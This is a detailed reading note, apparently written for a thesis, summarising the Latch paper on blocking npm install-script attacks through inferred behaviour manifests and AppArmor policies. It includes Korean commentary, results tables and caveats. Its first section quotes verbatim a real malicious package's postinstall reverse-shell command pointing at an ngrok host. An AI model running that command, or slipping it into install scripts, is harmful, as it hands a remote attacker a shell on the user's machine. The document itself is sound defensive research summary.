# Wolf at the Door: Preventing Install-Time Attacks in npm with Latch

**Authors:** Elizabeth Wyss, Alexander Wittman, Drew Davidson (University of Kansas); Lorenzo De Carli (Worcester Polytechnic Institute)
**Venue / Year:** ACM AsiaCCS 2022 (ASIA CCS '22, May 30 – June 3 2022, Nagasaki, Japan), pp. 1139–1153, 15 pages
**Links:** [ACM DL](https://dl.acm.org/doi/abs/10.1145/3488932.3523262) · [author PDF](https://ldklab.github.io/assets/papers/asiaccs22-latch.pdf) · DOI 10.1145/3488932.3523262 · artifacts on [OSF](https://osf.io/pa8c2/) and [GitHub](https://github.com/elizabethwyss/Latch) · CC-BY 4.0
**Scope tag:** ADJACENT
**Grounding:** full text read from the author-hosted PDF (Sections 1–9 including Table 1 and the evaluation RQ summary). All numbers below are from that text.

**Relation to a thesis on discovering Electron-app vulnerabilities (one line):** Electron applications are npm applications — they are assembled by `npm install` and inherit every transitive dependency's install-time shell script, so this paper defines and measures an attack surface that exists in every Electron app *before the app has ever run a line of its own code*.

> **한 줄 요약 (KO):** npm 패키지의 `preinstall`/`install`/`postinstall` 훅은 설치만 해도 사용자 권한(전역 설치 시 root)으로 셸 스크립트를 실행하므로, 패키지를 import조차 하지 않아도 공격이 성립한다. Latch는 각 패키지의 설치 시점 동작을 샌드박스 추적으로 자동 요약한 "permission manifest"를 만들고 사용자가 정의한 정책과 대조해 설치를 차단하며, 전체 npm(최신 149만 + 구버전 1,514만 버전)에 적용해도 개발자 정책 위반률 1.5%, 레지스트리 관리자 정책 0.013%로 방해가 적으면서 테스트한 악성 패키지 102개를 100% 잡아냈다.

## 1. Problem, Gap & Hypothesis

The npm install pipeline is itself an execution vector. A package may register `preinstall`, `install` and `postinstall` shell scripts that npm runs automatically during `npm install` (Figure 1(a) lays out the hook order: fetch files → extract → preinstall → install → postinstall → finalize → update package JSON). Consequences the paper stresses:

1. **The attack completes even if the package is never imported or run.** Nothing in the victim's code has to touch the malicious package.
2. **Scripts run with the installing user's permissions** — and for globally-installed packages, with root, unless npm has been reconfigured to a non-root prefix.
3. **Transitive closure means consent is meaningless.** A single `npm install` pulls the whole dependency tree and runs everybody's hooks. The paper cites a study finding >93% of all lines of code across npm packages live in third-party dependencies, not the package's own files.

The paper's running example is the real `twilio-npm` typosquat, whose entire `postinstall` is a reverse shell: `bash -i >& /dev/tcp/4.tcp.ngrok.io/11425 0>&1`. Over one hundred install-script attacks are documented in the wild.

The gap the authors identify is a *policy* gap, not a detection gap. There is no consensus on which install-time behaviours are unacceptable: registry maintainers want to weed out outright malware while still encouraging publication, whereas an individual developer may want a much tighter boundary. Prior malicious-package detectors impose one fixed notion of "bad". Latch's stated key insight is the opposite — **expressive policies let each user define their own boundary**, and the system ships two template policies (a strict *developer* policy and a permissive *maintainer* policy) as ready-made instantiations of two distinct security postures.

Three design constraints are stated up front: configurability (the policy language), automation (manifests are *inferred*, never authored — unlike Android, which makes developers write the manifest), and performance at registry scale.

> **(KO)** 이 논문이 잡는 지점은 "탐지 알고리즘"이 아니라 "허용 기준의 부재"다. 같은 행동(예: `/etc/passwd` 읽기)이 누구에게는 정상이고 누구에게는 침해라서, 단일 악성 판정기로는 풀 수 없다는 논증이 핵심이다. Electron 앱 보안에서도 동일한 구조의 문제가 있다 — 어떤 preload API 노출이 "과도한가"는 앱마다 다르다.

## 2. Methodology

**Manifest inference.** Every package's installation is executed in a sandbox and **system-call-traced**; the trace is distilled into a *behaviour manifest* — a succinct summary of the security-relevant install-time operations the package actually performs. No developer cooperation and no manual annotation is required, and manifests are batch-generated across the registry and cached.

**Two lines of defence at install time.**
1. *Manifest enforcement* — the cached manifest is checked against the user's policy before installation; a violation aborts the install.
2. *Live enforcement* — during the actual install, deviations from policy are blocked by a **kernel-level security module**, because install scripts can be non-deterministic and may do something their manifest did not record. The prototype translates the default developer policy into an **AppArmor** profile, deliberately over-restrictive where AppArmor is less expressive than Latch, so that safety is preserved.

**Policy language.** A formal language over the manifest attributes (file reads/writes/deletes and their paths, process execution, network sockets, etc.), from which the two templates are built: the **developer** policy (strict) and the **maintainer** policy (permissive, data-driven — built from a known-malicious-package corpus to block the most widely used install-script attack shapes).

**Prototype scope.** npm only, chosen as the largest registry and the one with the most attack reports, though the authors argue the technique ports to other ecosystems.

> **(KO)** 방법론상 가장 이식성 있는 아이디어는 "매니페스트를 개발자가 쓰는 게 아니라 **추론**한다"는 점이다. Android 퍼미션 모델과의 차이를 저자들이 명시적으로 대비시키는데(§8), Electron 앱의 preload 노출 표면을 자동 추론해 정책과 대조하는 연구로 바로 옮길 수 있는 설계다.

## 3. Experiments / Evaluation Setup

Four research questions (RQ1 discrimination quality, RQ2 developer-workflow disruption, RQ3 registry-scale performance, RQ4 live-enforcement soundness), evaluated on:

- **The entire public npm registry:** **1,493,231 latest-version packages** and **15,136,563 old versions**. Of these, **36,438 distinct packages declare installation scripts** — the actual population under test for live enforcement.
- **Known-malicious corpus:** **102 packages** (from the Duan et al. dataset, ref [44]).
- **Potentially-undesirable corpus:** **22 packages** (from ref [24]) — packages that are not malicious but send machine specs, machine identifiers, or installed-package lists to remote tracking APIs.
- **Policies under test:** the developer template and the maintainer template.
- **Live enforcement:** the developer policy translated to AppArmor, then the install scripts of the latest versions of all 36,438 script-declaring packages executed under it, tracking AppArmor denials.
- **Disruption metric:** package **download counts** as a proxy for how often a real user would hit a block; <350 downloads/week treated as "likely never installed by a real user" (npm's own estimate is that a package can be downloaded up to 50×/day by mirrors and bots with no human installing it).

## 4. Results / Key Findings

**RQ1 — discrimination (Table 1).**

| Policy | npm latest (1,493,231) | npm old (15,136,563) | Malicious (102) | Undesirable (22) |
|---|---|---|---|---|
| Developer | 16,271 | 232,466 | **102 (100%)** | 18 (82%) |
| Maintainer | 681 | 1,543 | **101 (99%)** | 3 (14%) |

Overall violation rates: developer **1.5%** of all package versions, maintainer **0.013%**. The single malicious package the maintainer policy misses prints the user's SSH keys to the terminal — behaviour whose permission profile is indistinguishable from benignly reading `/etc/passwd` to identify the user. The authors are candid that the maintainer policy's 99% recall is partly circular: the malicious corpus that tested it also trained it, so the figure demonstrates that data-driven policy generation works, *not* that it generalises to unseen malware.

**RQ2 — disruption.** Installation interruptions occur in **1.6%** of installs under the developer policy and **0.3%** under the maintainer policy. The 248,737 and 2,224 raw violations collapse to only **24,345** and **1,775 distinct packages**; over **92.5%** (developer) and **90.3%** (maintainer) of violations sit in rarely-downloaded packages.

**RQ3 — performance.** **90% of packages** have their manifest inferred in **under a minute**; **99%** have their manifest *enforced* in **under a second**.

**RQ4 — live enforcement.** **100%** of install scripts denied by manifest enforcement are also denied by AppArmor, and **93.8%** of those allowed by manifest enforcement are also allowed live. Overhead: **<1% on average**, worst case **88%**, concentrated in file-access-heavy scripts. Of a hand-examined sample of 50 allowed-then-denied discrepancies, **44%** were buggy scripts that crash during execution (12 crashed mid-manifest-inference; 10 were denied because the AppArmor profile pre-emptively blocks native binaries such as Linux `install` that exist only to perform disallowed operations) and the remaining **56%** were AppArmor's coarse network-socket granularity — an engineering gap, not a scientific one, per the authors.

**Suspicious behaviours actually found in the wild.**
- Many packages update, rename, delete or chmod files *outside* the user's home directory, nearly always by mistake — e.g. removing `/build` instead of `./build` before a rebuild. These appear in near-zero-download packages and get fixed in later versions, which leads the authors to suggest Latch also works as a **pre-publication testing tool** for unintended install behaviour.
- **`opsie`**: writes to `/dev/initctl` and `/run/initctl`, i.e. issues a Linux `reboot` — its purpose is to destroy the installer's unsaved work without warning. Reported to the npm security team and **removed from npm**.
- **364 instances** of modifying startup/login shell files: `~/.bashrc` (281), `~/.bash_profile` (80), `~/.profile` (14) — a natural backdoor location. Sampled instances were benign (env vars, tool loading).
- **3,235 packages** create and then execute a file; sampled cases were mostly sanity-running a just-compiled binary with `--version`.

## 5. How to cite in Related Work

> A dependency need not be executed to compromise its host: npm runs `preinstall`, `install` and `postinstall` shell scripts automatically during installation, with the installing user's privileges and with no user involvement across the full transitive dependency closure. Wyss et al. quantify this surface and propose Latch, which infers a per-package behaviour manifest by system-call-tracing each installation in a sandbox and checks it against a user-defined policy, backed at install time by kernel-level (AppArmor) enforcement [Wyss et al., AsiaCCS '22]. Applied to the whole registry — 1.49M latest and 15.1M historical package versions, of which 36,438 declare install scripts — their strict developer policy flags 1.5% of package versions while catching all 102 packages in a known-malicious corpus, and interrupts only 1.6% of installs. This matters directly for Electron applications, which are assembled by `npm install` and therefore inherit the install-time behaviour of every transitive dependency before any application code executes; the packaging step of an Electron build additionally runs native-addon compilation through the same hook mechanism.

> **(KO) 논문 내 위치:** 방어(defense) 쪽 대조군이자, **공격 표면 열거의 경계 설정**용으로 쓰인다.
> - **대조로 쓰는 법:** "Electron 앱의 공급망 위험은 런타임 import 경로만이 아니라 설치 시점 훅에도 있다. Latch는 그 설치 시점 경로를 커널 수준에서 봉쇄하지만, 앱이 이미 설치된 뒤 렌더러에서 열리는 권한 경로(preload, IPC, nodeIntegration)에는 아무 영향이 없다" — 즉 본 학위논문이 다루는 표면과 **상보적**이며 겹치지 않음을 명확히 선 그을 때 인용.
> - **남긴 빈틈:** Latch의 정책은 파일/프로세스/네트워크 같은 OS 수준 권한으로 표현된다. Electron의 위험한 노출은 OS 권한이 아니라 **애플리케이션 수준 API**(`contextBridge.exposeInMainWorld`로 렌더러에 넘긴 함수, `ipcRenderer.invoke` 채널)로 표현되므로, Latch식 "동작 추론 → 정책 대조" 프레임을 애플리케이션 API 층위로 끌어올린 연구는 아직 없다. 이 논문을 인용하면서 그 층위 이동을 본 학위논문의 기여로 제시할 수 있다.
> - **부수 효과:** 저자들 스스로 Latch를 "출시 전 테스트 도구"로 쓸 수 있다고 제안한 부분(§6.1)은, Electron 앱 빌드 파이프라인 감사 도구를 정당화할 때 인용할 만한 선례다.

## 6. Caveats / what I could not confirm from the text

- **The maintainer policy's 99% malicious-package recall is trained and tested on the same corpus**, as the authors state outright; it is evidence that data-driven policy generation works, not a generalisation claim. Do not quote it as a detection rate against unseen malware.
- Prototype and evaluation are **Linux/AppArmor only**. Windows and macOS — the platforms most Electron apps ship to — are untested, and the live-enforcement results do not transfer without a comparable kernel MAC layer.
- The 1.6% / 0.3% "disruption" figures are **download-count proxies**, not observations of real developer workflows; the authors acknowledge npm download counts include mirrors and bots.
- The "potentially undesirable" corpus is only **22 packages**, so the 82% / 14% figures rest on very small absolute counts (18 and 3 packages).
- The worst-case **88% live-enforcement overhead** is reported but I did not read Figure 9's full distribution; only the <1% average and the worst case are grounded here.
- Sections 3 (Motivation), 4.2–4.4 and 5 (policy language syntax) were read only in outline; the formal grammar of the policy language is not reproduced in this note.
- Related-work references chased against the nine venues and found already dispositioned: Koishybayev et al. = Mininode (RAID '20, in_scope); Vasilakis et al. = Mir (CCS '21, in_scope); Duan et al. = "Towards Measuring Supply Chain Attacks on Package Managers for Interpreted Languages" (NDSS '21, already excluded); Staicu et al. Synode (NDSS '18, pre-2020). Nothing new at a watched venue.
- **This paper closes a standing ledger item:** `usenixsec2023-sanddriller`'s pending bibliography note flagged "Wyss et al. on syscall filtering of install-time npm hooks — venue not stated in the citing text". That citation is this paper.
